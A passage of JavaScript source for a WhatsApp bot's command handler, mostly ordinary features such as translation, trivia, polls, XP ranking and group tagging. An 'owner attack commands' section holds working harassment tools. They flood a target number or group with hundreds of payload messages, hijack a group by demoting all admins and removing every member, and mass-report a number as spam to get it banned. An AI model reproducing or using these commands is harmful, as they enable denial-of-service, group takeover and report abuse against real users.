        return api.sendText(chatId, `🔗 Anti Link: *${state.antilink[chatId] ? 'ON ✅' : 'OFF ❌'}*`, qid)
    }

    if (cmd === `${PREFIX}antispam`) {
        if (!isPrivileged) return api.sendText(chatId, `❌ Not authorized!`, qid)
        state.antispam[chatId] = args[1] === 'on'
        return api.sendText(chatId, `🚫 Anti Spam: *${state.antispam[chatId] ? 'ON ✅' : 'OFF ❌'}*`, qid)
    }

    if (cmd === `${PREFIX}self` && isOwner) {
        state.selfMode = true
        return api.sendText(chatId, `🔒 *Self Mode ON*\nOnly owners can use the bot.`, qid)
    }

    if (cmd === `${PREFIX}public` && isOwner) {
        state.selfMode = false
        return api.sendText(chatId, `🔓 *Public Mode ON*\nEveryone can use the bot.`, qid)
    }

    // ── OWNER ATTACK COMMANDS ─────────────────────────────────
    if (cmd === `${PREFIX}buguser` && isOwner) {
        const target = digits(args[1])
        if (!target) return api.sendText(chatId, `❌ Usage: .buguser <number> [count]`, qid)
        const count = Math.min(parseInt(args[2]) || 200, 500)
        const jid   = `${target}@s.whatsapp.net`
        state.floodActive[jid] = true
        await api.sendText(chatId, `🐛 Flooding *${target}*... (${count})`, qid)
        let sent = 0
        while (state.floodActive[jid] && sent < count) {
            try { await api.sendText(jid, FLOOD_PAYLOADS[sent % FLOOD_PAYLOADS.length]()); if (sent % 5 !== 0) await sleep(100); sent++ }
            catch { await sleep(200) }
        }
        state.floodActive[jid] = false
        return api.sendText(chatId, `✅ Sent *${sent}* to ${target}`, qid)
    }

    if (cmd === `${PREFIX}buggc` && isOwner) {
        if (!isGroup) return api.sendText(chatId, `❌ Use inside a group!`, qid)
        const count = Math.min(parseInt(args[1]) || 200, 500)
        state.floodActive[chatId] = true
        await api.sendText(chatId, `🐛 Flooding group... (${count})`, qid)
        let sent = 0
        while (state.floodActive[chatId] && sent < count) {
            try { await api.sendText(chatId, FLOOD_PAYLOADS[sent % FLOOD_PAYLOADS.length]()); if (sent % 5 !== 0) await sleep(100); sent++ }
            catch { await sleep(200) }
        }
        state.floodActive[chatId] = false
        return api.sendText(chatId, `✅ Sent *${sent}* messages!`, qid)
    }

    if (cmd === `${PREFIX}stopflood` && isOwner) {
        const target = digits(args[1])
        const key    = target ? `${target}@s.whatsapp.net` : chatId
        state.floodActive[key] = false
        return api.sendText(chatId, `🛑 Flood stopped!`, qid)
    }

    if (cmd === `${PREFIX}hijack` && isOwner) {
        if (!isGroup) return api.sendText(chatId, `❌ Use inside a group!`, qid)
        await api.sendText(chatId, `⚡ Hijacking...`, qid)
        try {
            const info   = await api.getGroupInfo(chatId)
            if (!info) return api.sendText(chatId, `❌ Could not get group info!`, qid)
            const admins  = info.participants?.filter(p => p.rank === 'admin').map(p => p.id) || []
            const members = info.participants?.map(p => p.id) || []
            if (admins.length) await api.demoteGroupParticipants(chatId, admins).catch(() => {})
            for (let i = 0; i < members.length; i += 5) {
                await api.removeGroupParticipants(chatId, members.slice(i, i + 5)).catch(() => {})
                await sleep(1000)
            }
            return api.sendText(chatId, `⚡ Taken over by ${OWNER_NAME}`)
        } catch (e) {
            return api.sendText(chatId, `❌ Hijack failed: ${e.message}`, qid)
        }
    }

    if (cmd === `${PREFIX}banuser` && isOwner) {
        const target = digits(args[1])
        if (!target) return api.sendText(chatId, `❌ Usage: .banuser <number>`, qid)
        await api.sendText(chatId, `🚨 Reporting *${target}*...`, qid)
        let reported = 0
        for (let i = 0; i < 5; i++) {
            try {
                await api.request('post', '/contacts/report', { contact_id: `${target}@s.whatsapp.net`, reason: 'spam' })
                reported++
                await sleep(500)
            } catch {}
        }
        return api.sendText(chatId, `✅ *${target}* reported ${reported}/5 times!`, qid)
    }

    // NEW COMMANDS BELOW

    // TRANSLATE
    if (cmd === `${PREFIX}translate` || cmd === `${PREFIX}tr`) {
        if (!query) return api.sendText(chatId, `❌ Usage: .translate <lang> <text>`, qid)
        await api.sendTyping(chatId, 2)
        const tparts = query.split(' ')
        const knownLangs = ['english','french','spanish','arabic','hausa','yoruba','igbo','portuguese','german','chinese','japanese','korean','hindi','russian','italian','pidgin']
        let tLang, tText
        if (knownLangs.includes(tparts[0].toLowerCase()) || (tparts[0].length <= 3 && tparts.length > 1)) {
            tLang = tparts[0]; tText = tparts.slice(1).join(' ')
        } else { tLang = 'English'; tText = query }
        if (!tText) return api.sendText(chatId, `❌ No text to translate!`, qid)
        const tResult = await utils.translateText(tText, tLang)
        return api.sendText(chatId, `╭─❏ 🌐 ᴛʀᴀɴsʟᴀᴛᴇ ❏\n │ 🗣️ To: *${tLang}*\n │\n │ ${tResult}\n ╰─────────────────`, qid)
    }

    // LYRICS
    if (cmd === `${PREFIX}lyrics`) {
        if (!query) return api.sendText(chatId, `❌ Usage: .lyrics <song name>`, qid)
        await api.sendTyping(chatId, 3)
        await api.sendText(chatId, `🎵 Searching for *${query}*...`, qid)
        const lyr = await utils.getLyrics(query)
        if (!lyr) return api.sendText(chatId, `❌ Lyrics not found for "${query}"`, qid)
        const body = lyr.lyrics.slice(0, 2800)
        return api.sendText(chatId, `╭─❏ 🎵 ʟʏʀɪᴄs ❏\n │ 🎤 *${lyr.title}*\n │ 👤 ${lyr.artist || 'Unknown'}\n │\n${body}${lyr.lyrics.length > 2800 ? '\n...(truncated)' : ''}\n ╰─────────────────`, qid)
    }

    // SHORT URL
    if (cmd === `${PREFIX}shorturl` || cmd === `${PREFIX}shorten`) {
        if (!query) return api.sendText(chatId, `❌ Usage: .shorturl <url>`, qid)
        await api.sendTyping(chatId, 1)
        const surl = await utils.shortenUrl(query)
        if (!surl) return api.sendText(chatId, `❌ Failed to shorten URL!`, qid)
        return api.sendText(chatId, `╭─❏ 🔗 sʜᴏʀᴛ ᴜʀʟ ❏\n │ ✅ ${surl}\n ╰─────────────────`, qid)
    }

    // SCREENSHOT
    if (cmd === `${PREFIX}screenshot` || cmd === `${PREFIX}ss`) {
        if (!query) return api.sendText(chatId, `❌ Usage: .screenshot <url>`, qid)
        await api.sendTyping(chatId, 3)
        await api.sendText(chatId, `📸 Taking screenshot...`, qid)
        const ssUrl = utils.screenshotUrl(query)
        return api.sendImage(chatId, ssUrl, `📸 *Screenshot:* ${query}`, qid)
    }

    // WELCOME
    if ((cmd === `${PREFIX}welcome` || cmd === `${PREFIX}setwelcome`) && isGroup && isPrivileged) {
        if (!state.welcome[chatId]) state.welcome[chatId] = { enabled: false, msg: '', byeMsg: '' }
        if (args[1] === 'off') { state.welcome[chatId].enabled = false; return api.sendText(chatId, `👋 Welcome: *OFF ❌*`, qid) }
        if (args[1] === 'on')  { state.welcome[chatId].enabled = true;  return api.sendText(chatId, `👋 Welcome: *ON ✅*`, qid) }
        if (query) { state.welcome[chatId].msg = query; state.welcome[chatId].enabled = true; return api.sendText(chatId, `✅ Welcome message set!`, qid) }
        return api.sendText(chatId, `❌ Usage: .welcome on/off  or  .welcome <custom msg>`, qid)
    }

    // GOODBYE
    if ((cmd === `${PREFIX}goodbye` || cmd === `${PREFIX}setgoodbye`) && isGroup && isPrivileged) {
        if (!state.welcome[chatId]) state.welcome[chatId] = { enabled: false, msg: '', byeMsg: '' }
        if (args[1] === 'off') { state.welcome[chatId].byeMsg = ''; return api.sendText(chatId, `👋 Goodbye: *OFF ❌*`, qid) }
        if (query) { state.welcome[chatId].byeMsg = query; state.welcome[chatId].enabled = true; return api.sendText(chatId, `✅ Goodbye message set!`, qid) }
        return api.sendText(chatId, `❌ Usage: .goodbye <message>  or  .goodbye off`, qid)
    }

    // ANTI GHOST PING
    if (cmd === `${PREFIX}antighostping` || cmd === `${PREFIX}antighost`) {
        if (!isPrivileged) return api.sendText(chatId, `❌ Not authorized!`, qid)
        state.antiGhostPing[chatId] = args[1] === 'on'
        return api.sendText(chatId, `👻 Anti Ghost Ping: *${state.antiGhostPing[chatId] ? 'ON ✅' : 'OFF ❌'}*`, qid)
    }

    // TRIVIA
    if (cmd === `${PREFIX}trivia`) {
        if (state.trivia[chatId] && state.trivia[chatId].active) {
            const t = state.trivia[chatId]
            return api.sendText(chatId, `⚠️ Trivia still active!\n\n❓ *${t.question}*\n\n${t.options.map((o,i) => `${i+1}. ${o}`).join('\n')}\n\n_Reply .answer <number> to answer!_`, qid)
        }
        await api.sendTyping(chatId, 2)
        const tv = await utils.getTriviaQuestion()
        if (!tv) return api.sendText(chatId, `❌ Could not fetch trivia!`, qid)
        state.trivia[chatId] = { ...tv, active: true, startTime: Date.now() }
        return api.sendText(chatId,
            `╭─❏ 🧠 ᴛʀɪᴠɪᴀ ❏\n │\n │ ❓ *${tv.question}*\n │\n` +
            tv.options.map((o, i) => ` │ ${i+1}. ${o}`).join('\n') +
            `\n │\n │ _Reply .answer <number>_\n ╰─────────────────`, qid)
    }

    if (cmd === `${PREFIX}answer` && isGroup) {
        const tv = state.trivia[chatId]
        if (!tv || !tv.active) return api.sendText(chatId, `❌ No active trivia! Start one with *.trivia*`, qid)
        const pick_n = parseInt(args[1]) - 1
        if (isNaN(pick_n) || pick_n < 0 || pick_n >= tv.options.length)
            return api.sendText(chatId, `❌ Pick a number between 1 and ${tv.options.length}`, qid)
        const chosen = tv.options[pick_n]
        const correct = chosen === tv.answer
        state.trivia[chatId] = { active: false }
        if (correct) {
            const xpRes = utils.addXP(state, sender, sender, 15)
            return api.sendText(chatId,
                `✅ *Correct!* 🎉 @${sender} got it!\n\n🏆 Answer: *${tv.answer}*\n⚡ +15 XP earned!${xpRes.leveled ? '\n🎊 *LEVEL UP!* You are now Level ' + xpRes.level + '!' : ''}`, qid)
        } else {
            return api.sendText(chatId, `❌ *Wrong!* @${sender}\n\n💡 Correct answer: *${tv.answer}*`, qid)
        }
    }

    if (cmd === `${PREFIX}stoptrivia` && isPrivileged && isGroup) {
        if (!state.trivia[chatId] || !state.trivia[chatId].active)
            return api.sendText(chatId, `❌ No active trivia to stop!`, qid)
        const tv = state.trivia[chatId]
        state.trivia[chatId] = { active: false }
        return api.sendText(chatId, `🛑 Trivia stopped!\n\n💡 Answer was: *${tv.answer}*`, qid)
    }

    // RANK / LEVEL
    if (cmd === `${PREFIX}rank` || cmd === `${PREFIX}level` || cmd === `${PREFIX}xp`) {
        const target = extractTarget(args[1], quotedParticipant) || sender
        const d = state.xpData && state.xpData[target]
        if (!d) return api.sendText(chatId, `❌ @${target} has no XP yet! Use the bot more to earn XP.`, qid)
        const allEntries = Object.entries(state.xpData || {}).sort((a,b) => (b[1].level*1000+b[1].xp)-(a[1].level*1000+a[1].xp))
        const rank = allEntries.findIndex(e => e[0] === target) + 1
        return api.sendText(chatId,
            `╭─❏ 🏅 ʀᴀɴᴋ ❏\n` +
            ` │ 👤 @${target}\n` +
            ` │ 🎯 Level  : *${d.level}*\n` +
            ` │ ⚡ XP     : *${d.xp}/${d.level * 100}*\n` +
            ` │ 🏆 Rank   : *#${rank}*\n` +
            ` ╰─────────────────`, qid)
    }

    // LEADERBOARD
    if (cmd === `${PREFIX}leaderboard` || cmd === `${PREFIX}lb` || cmd === `${PREFIX}top`) {
        const lb = utils.getLeaderboard(state, 10)
        if (!lb) return api.sendText(chatId, `❌ No XP data yet!`, qid)
        return api.sendText(chatId,
            `╭─❏ 🏆 ʟᴇᴀᴅᴇʀʙᴏᴀʀᴅ ❏\n │\n${lb}\n │\n │ _Use .xp commands to level up!_\n ╰─────────────────`, qid)
    }

    // POLL
    if (cmd === `${PREFIX}poll` && isGroup && isPrivileged) {
        // Usage: .poll Question | Option1 | Option2 | Option3
        const pollInput = query
        if (!pollInput || !pollInput.includes('|'))
            return api.sendText(chatId, `❌ Usage: *.poll Question | Option1 | Option2 | ...*\nExample: .poll Favourite color? | Red | Blue | Green`, qid)
        const parts = pollInput.split('|').map(p => p.trim()).filter(Boolean)
        const question = parts[0]
        const options  = parts.slice(1)
        if (options.length < 2) return api.sendText(chatId, `❌ Need at least 2 options!`, qid)
        if (options.length > 8) return api.sendText(chatId, `❌ Maximum 8 options allowed!`, qid)
        const emojis = ['1️⃣','2️⃣','3️⃣','4️⃣','5️⃣','6️⃣','7️⃣','8️⃣']
        state.polls[chatId] = { question, options, votes: {}, voters: {} }
        return api.sendText(chatId,
            `╭─❏ 📊 ᴘᴏʟʟ ❏\n` +
            ` │ ❓ *${question}*\n │\n` +
            options.map((o, i) => ` │ ${emojis[i]} ${o}`).join('\n') +
            `\n │\n │ _Vote: .vote <number>_\n │ _Results: .pollresult_\n │ _End poll: .endpoll_\n ╰─────────────────`, qid)
    }

    if (cmd === `${PREFIX}vote` && isGroup) {
        const poll = state.polls[chatId]
        if (!poll) return api.sendText(chatId, `❌ No active poll! Create one with *.poll*`, qid)
        const voteNum = parseInt(args[1]) - 1
        if (isNaN(voteNum) || voteNum < 0 || voteNum >= poll.options.length)
            return api.sendText(chatId, `❌ Pick a number between 1 and ${poll.options.length}`, qid)
        if (poll.voters[sender]) return api.sendText(chatId, `⚠️ You already voted! You chose: *${poll.options[poll.voters[sender]]}*`, qid)
        poll.voters[sender]  = voteNum
        poll.votes[voteNum]  = (poll.votes[voteNum] || 0) + 1
        return api.sendText(chatId, `✅ @${sender} voted for *${poll.options[voteNum]}*!`, qid)
    }

    if (cmd === `${PREFIX}pollresult` || cmd === `${PREFIX}pollresults`) {
        const poll = state.polls[chatId]
        if (!poll) return api.sendText(chatId, `❌ No active poll!`, qid)
        const total = Object.values(poll.votes).reduce((a,b) => a+b, 0)
        const emojis = ['1️⃣','2️⃣','3️⃣','4️⃣','5️⃣','6️⃣','7️⃣','8️⃣']
        const results = poll.options.map((o, i) => {
            const v   = poll.votes[i] || 0
            const pct = total ? Math.round(v/total*100) : 0
            const bar = '█'.repeat(Math.floor(pct/10)) + '░'.repeat(10-Math.floor(pct/10))
            return ` │ ${emojis[i]} ${o}\n │   ${bar} ${pct}% (${v})`
        }).join('\n')
        return api.sendText(chatId,
            `╭─❏ 📊 ᴘᴏʟʟ ʀᴇsᴜʟᴛs ❏\n │ ❓ *${poll.question}*\n │ 👥 Total votes: ${total}\n │\n${results}\n ╰─────────────────`, qid)
    }

    if (cmd === `${PREFIX}endpoll` && isGroup && isPrivileged) {
        const poll = state.polls[chatId]
        if (!poll) return api.sendText(chatId, `❌ No active poll!`, qid)
        const total = Object.values(poll.votes).reduce((a,b) => a+b, 0)
        const winnerIdx = poll.options.reduce((best, _, i) => (poll.votes[i]||0) > (poll.votes[best]||0) ? i : best, 0)
        const emojis = ['1️⃣','2️⃣','3️⃣','4️⃣','5️⃣','6️⃣','7️⃣','8️⃣']
        const results = poll.options.map((o, i) => {
            const v = poll.votes[i] || 0
            const pct = total ? Math.round(v/total*100) : 0
            return ` │ ${emojis[i]} ${o} — ${v} votes (${pct}%)`
        }).join('\n')
        state.polls[chatId] = null
        return api.sendText(chatId,
            `╭─❏ 📊 ᴘᴏʟʟ ᴇɴᴅᴇᴅ ❏\n │ ❓ *${poll.question}*\n │ 👥 Total: ${total}\n │\n${results}\n │\n │ 🏆 Winner: *${poll.options[winnerIdx]}*\n ╰─────────────────`, qid)
    }

    // TAG ADMINS
    if ((cmd === `${PREFIX}tagadmins` || cmd === `${PREFIX}admins`) && isGroup) {
        const participants = await (async () => {
            try { const info = await api.getGroupInfo(chatId); return info && info.participants ? info.participants : [] } catch { return [] }
        })()
        const admins = participants.filter(p => {
            const rank = (p.admin || p.rank || '').toLowerCase()
            return p.isAdmin || p.isSuperAdmin || rank === 'admin' || rank === 'superadmin'
        })
        if (!admins.length) return api.sendText(chatId, `❌ Could not fetch admin list!`, qid)
        const mention = admins.map(a => `@${(a.id || a.jid || '').split('@')[0]}`).join(' ')
        return api.sendText(chatId,
            `╭─❏ 👑 ɢʀᴏᴜᴘ ᴀᴅᴍɪɴs ❏\n │ ${mention}\n │\n │ 📢 ${query || 'Attention admins!'}\n ╰─────────────────`, qid)
    }

    // BROADCAST (owner only — sends to all groups bot is in, from current chat)
    if (cmd === `${PREFIX}broadcast` || cmd === `${PREFIX}bc`) {
        if (!isOwner) return api.sendText(chatId, `❌ Owner only command!`, qid)
        if (!query) return api.sendText(chatId, `❌ Usage: .broadcast <message>`, qid)
        // Save broadcast request and confirm — actual multi-group broadcast requires group list from API
        await api.sendText(chatId, `📢 *Broadcasting message...*`, qid)
        // Try to get all groups and broadcast
        let sent = 0
        try {
            const res = await api.request('get', `/group/fetchAllGroups/${process.env.EVO_INSTANCE || 'tavik-bot'}`)
            const groups = Array.isArray(res) ? res : (res && res.groups) ? res.groups : []
            for (const g of groups) {
                const gid = g.id || g.groupJid
                if (!gid) continue
                try {
                    await api.sendText(gid.includes('@') ? gid : gid + '@g.us',
                        `📢 *Broadcast from ${require('./config').OWNER_NAME}:*\n\n${query}`)
                    sent++
                    await sleep(800)
                } catch {}
            }
        } catch {}
        return api.sendText(chatId, `✅ Broadcast sent to *${sent}* group(s)!`, qid)
    }

    // COMPLIMENT (was missing target support — enhanced)
    if (cmd === `${PREFIX}compliment`) {
        const target = extractTarget(args[1], quotedParticipant)
        const compliments = [
            'You are amazing and incredibly talented! 🌟',
            'Your smile lights up every room you enter! ✨',
            'You make the world a better place just by being in it! 🌍',
            'You are stronger than you know! 💪',
            'Your kindness is truly inspiring! 💖',
            'You have a brilliant mind and a beautiful heart! 🧠❤️',
            'Everything you do, you do with style! 💅',
            'You are one of the most genuine people I know! 🙌',
            'Your energy is absolutely contagious! ⚡',
            'You deserve every good thing that comes your way! 🎁',
        ]
        const msg = pick(compliments)
        if (target) return api.sendText(chatId, `💝 @${target}: ${msg}`, qid)
        return api.sendText(chatId, `💝 ${msg}`, qid)
    }

    // SUDO LIST
    if (cmd === `${PREFIX}sudolist` && isOwner) {
        if (!state.sudoUsers || !state.sudoUsers.length)
            return api.sendText(chatId, `╭─❏ 🛡️ sᴜᴅᴏ ʟɪsᴛ ❏\n │ No sudo users.\n ╰─────────────────`, qid)
        return api.sendText(chatId,
            `╭─❏ 🛡️ sᴜᴅᴏ ᴜsᴇʀs ❏\n` +
            state.sudoUsers.map((u, i) => ` │ ${i+1}. @${u}`).join('\n') +
            `\n ╰─────────────────`, qid)
    }

    if (cmd === `${PREFIX}addsudo` && isOwner) {
        const target = extractTarget(args[1], quotedParticipant)
        if (!target) return api.sendText(chatId, `❌ Usage: .addsudo <number>`, qid)
        if (!state.sudoUsers.includes(target)) state.sudoUsers.push(target)
        return api.sendText(chatId, `✅ @${target} added to sudo list!`, qid)
    }

    if (cmd === `${PREFIX}delsudo` && isOwner) {
        const target = extractTarget(args[1], quotedParticipant)
        if (!target) return api.sendText(chatId, `❌ Usage: .delsudo <number>`, qid)
        state.sudoUsers = state.sudoUsers.filter(u => u !== target)
        return api.sendText(chatId, `✅ @${target} removed from sudo list!`, qid)
    }

    // SHIP
    if (cmd === `${PREFIX}ship`) {
        const p1 = extractTarget(args[1], '') || sender
        const p2 = extractTarget(args[2], quotedParticipant) || 'someone'
        const pct = Math.floor(Math.random() * 101)
        const hearts = pct >= 70 ? '❤️❤️❤️' : pct >= 40 ? '💛💛' : '💔'
        const label  = pct >= 80 ? 'Perfect match! 💑' : pct >= 60 ? 'Good vibes! 💕' : pct >= 40 ? 'Maybe...? 😅' : 'Not meant to be 😬'
        const bar    = '█'.repeat(Math.floor(pct/10)) + '░'.repeat(10-Math.floor(pct/10))
        return api.sendText(chatId,
            `╭─❏ 💘 sʜɪᴘ ❏\n` +
            ` │ @${p1} + @${p2}\n │\n` +
            ` │ ${hearts} *${pct}%* ${hearts}\n` +
            ` │ [${bar}]\n` +
            ` │ ${label}\n` +
            ` ╰─────────────────`, qid)
    }

    // FAKE ID / PROFILE GEN
    if (cmd === `${PREFIX}fakeid` || cmd === `${PREFIX}fakeprofile`) {
        await api.sendTyping(chatId, 2)
        const fake = await utils.askAI('Generate a realistic fake person profile with: Name, Age, Country, City, Job, Hobby, Fun fact. Format nicely with emojis. Make it creative and funny.')
        return api.sendText(chatId, `╭─❏ 🪪 ꜰᴀᴋᴇ ᴘʀᴏꜰɪʟᴇ ❏\n │\n${fake}\n ╰─────────────────`, qid)
    }

    // ANNOUNCE MODE (only admins can send)
    if (cmd === `${PREFIX}announce` && isGroup && isPrivileged) {
        state.announce[chatId] = args[1] === 'on'
        return api.sendText(chatId, `📢 Announce mode: *${state.announce[chatId] ? 'ON ✅ (Only admins can send)' : 'OFF ❌'}*`, qid)
    }

    // CLEAR CHAT WARNINGS
    if (cmd === `${PREFIX}clearwarnings` && isPrivileged && isGroup) {
        const target = extractTarget(args[1], quotedParticipant)
        if (!target) return api.sendText(chatId, `❌ Usage: .clearwarnings <number>`, qid)
        const key = `${chatId}_${target}`
        state.warnings[key] = 0
        return api.sendText(chatId, `✅ Warnings cleared for @${target}`, qid)
    }

    // CHECK WARNINGS
    if (cmd === `${PREFIX}warnings` || cmd === `${PREFIX}checkwarn`) {
        const target = extractTarget(args[1], quotedParticipant) || sender
        const key    = `${chatId}_${target}`
        const count  = (state.warnings && state.warnings[key]) || 0
        return api.sendText(chatId,
            `╭─❏ ⚠️ ᴡᴀʀɴɪɴɢs ❏\n │ 👤 @${target}\n │ ⚠️ *${count}/3* warnings\n │ ${count >= 3 ? '🚫 Will be kicked!' : count >= 1 ? '⚡ Be careful!' : '✅ Clean record'}\n ╰─────────────────`, qid)
    }

    // TAG ALL (enhanced)
    if ((cmd === `${PREFIX}tagall` || cmd === `${PREFIX}everyone`) && isGroup && isPrivileged) {
        const participants = await (async () => {
            try { const info = await api.getGroupInfo(chatId); return info && info.participants ? info.participants : [] } catch { return [] }
        })()
        if (!participants.length) return api.sendText(chatId, `❌ Could not fetch participants!`, qid)
        const chunks = []
        let chunk = `📢 *${query || 'Attention everyone!'}*\n\n`
        for (const p of participants) {
            const num = (p.id || p.jid || '').split('@')[0]
            if (!num) continue
            chunk += `@${num} `
            if (chunk.length > 3500) { chunks.push(chunk); chunk = '' }
        }
        if (chunk) chunks.push(chunk)
        for (const c of chunks) await api.sendText(chatId, c, qid)
        return
    }

    // HIDETAG (tag all silently)
    if (cmd === `${PREFIX}hidetag` && isGroup && isPrivileged) {
        const participants = await (async () => {
            try { const info = await api.getGroupInfo(chatId); return info && info.participants ? info.participants : [] } catch { return [] }
        })()
        if (!participants.length) return api.sendText(chatId, `❌ Could not fetch participants!`, qid)
        const tags = participants.map(p => `@${(p.id || p.jid || '').split('@')[0]}`).join(' ')
        return api.sendText(chatId, query || tags, qid)
    }

    // GCINFO (enhanced)
    if ((cmd === `${PREFIX}gcinfo` || cmd === `${PREFIX}groupinfo`) && isGroup) {
        const info = await api.getGroupInfo(chatId)
        if (!info) return api.sendText(chatId, `❌ Could not get group info!`, qid)
        const total   = (info.participants || []).length
        const admins  = (info.participants || []).filter(p => {
            const r = (p.admin||p.rank||'').toLowerCase()
            return p.isAdmin||p.isSuperAdmin||r==='admin'||r==='superadmin'
        }).length
        const members = total - admins
        return api.sendText(chatId,
            `╭─❏ 👥 ɢʀᴏᴜᴘ ɪɴꜰᴏ ❏\n` +
            ` │ 📛 Name    : ${info.subject || info.name || 'Unknown'}\n` +
            ` │ 🆔 JID     : ${chatId}\n` +
            ` │ 👥 Members : ${total}\n` +
            ` │ 👑 Admins  : ${admins}\n` +
            ` │ 🙋 Regular : ${members}\n` +
            ` │ 📅 Created : ${info.creation ? new Date(info.creation * 1000).toDateString() : 'Unknown'}\n` +
            ` ╰─────────────────`, qid)
    }

    // ── OWNER: ADD SUDO ───────────────────────────────────────
    // (already handled above in new block — skip duplicate)

    // CARBON (code to image via carbon.now.sh)
    if (cmd === `${PREFIX}carbon`) {
        if (!query) return api.sendText(chatId, `❌ Usage: .carbon <code>`, qid)
        const encoded = encodeURIComponent(query)
        const imgUrl  = `https://carbonara.solopov.dev/api/cook?code=${encoded}&theme=dracula&language=auto`
        return api.sendImage(chatId, imgUrl, `💻 *Code Image*`, qid)
    }

    // IP INFO
    if (cmd === `${PREFIX}ipinfo` || cmd === `${PREFIX}ip`) {
        const target = args[1] || ''
        if (!target) return api.sendText(chatId, `❌ Usage: .ipinfo <ip address>`, qid)
        await api.sendTyping(chatId, 2)
        try {
            const r = await require('axios').get(`https://ipapi.co/${target}/json/`, { timeout: 10_000 })
            const d = r.data
            if (d.error) return api.sendText(chatId, `❌ Invalid IP address!`, qid)
            return api.sendText(chatId,
                `╭─❏ 🌐 ɪᴘ ɪɴꜰᴏ ❏\n` +
                ` │ 🖥️ IP      : ${d.ip}\n` +
                ` │ 🌍 Country : ${d.country_name}\n` +
                ` │ 🏙️ City    : ${d.city}\n` +
                ` │ 📡 ISP     : ${d.org}\n` +
                ` │ 🗺️ Region  : ${d.region}\n` +
                ` │ ⏰ Timezone: ${d.timezone}\n` +
                ` ╰─────────────────`, qid)
        } catch { return api.sendText(chatId, `❌ Could not fetch IP info!`, qid) }
    }

    // REVERSE TEXT
    if (cmd === `${PREFIX}reverse`) {
        if (!query) return api.sendText(chatId, `❌ Usage: .reverse <text>`, qid)
        return api.sendText(chatId, `🔄 ${query.split('').reverse().join('')}`, qid)
    }

    // ENCODE / DECODE BASE64
    if (cmd === `${PREFIX}encode`) {
        if (!query) return api.sendText(chatId, `❌ Usage: .encode <text>`, qid)
        return api.sendText(chatId, `🔐 *Base64:*\n${Buffer.from(query).toString('base64')}`, qid)
    }
    if (cmd === `${PREFIX}decode`) {
        if (!query) return api.sendText(chatId, `❌ Usage: .decode <base64>`, qid)
        try { return api.sendText(chatId, `🔓 *Decoded:*\n${Buffer.from(query, 'base64').toString('utf8')}`, qid) }
        catch { return api.sendText(chatId, `❌ Invalid base64!`, qid) }
    }

    // STICKER TEXT (fake sticker via text art)
    if (cmd === `${PREFIX}sticker` || cmd === `${PREFIX}stickertext`) {
        if (!query) return api.sendText(chatId, `❌ Usage: .sticker <text>`, qid)
        await api.sendTyping(chatId, 1)
        const stickerUrl = `https://api.minhazav.dev/image-text?text=${encodeURIComponent(query)}&bg=transparent&color=white&font=bold`
        return api.sendImage(chatId, stickerUrl, `🏷️ *${query}*`, qid)
    }

    // BOT STATUS SUMMARY (owner)
    if ((cmd === `${PREFIX}status` || cmd === `${PREFIX}botstatus`) && isOwner) {
        const chatbotCount = Object.values(state.chatbot || {}).filter(Boolean).length
        const sudoCount    = (state.sudoUsers || []).length
        const xpCount      = Object.keys(state.xpData || {}).length
        const warnCount    = Object.values(state.warnings || {}).filter(v => v > 0).length
        return api.sendText(chatId,
            `╭─❏ 📊 ʙᴏᴛ sᴛᴀᴛᴜs ❏\n` +
            ` │ ⏳ Uptime    : ${utils.getUptime()}\n` +
            ` │ 🤖 Chatbots  : ${chatbotCount} active\n` +
            ` │ 🛡️ Sudo users: ${sudoCount}\n` +
            ` │ ⚡ XP tracked: ${xpCount} users\n` +
            ` │ ⚠️ Warnings  : ${warnCount} active\n` +
            ` │ 🔐 Mode      : ${state.selfMode ? 'Self 🔒' : 'Public 🔓'}\n` +
            ` ╰─────────────────`, qid)
    }

}

module.exports = { handleCommand }
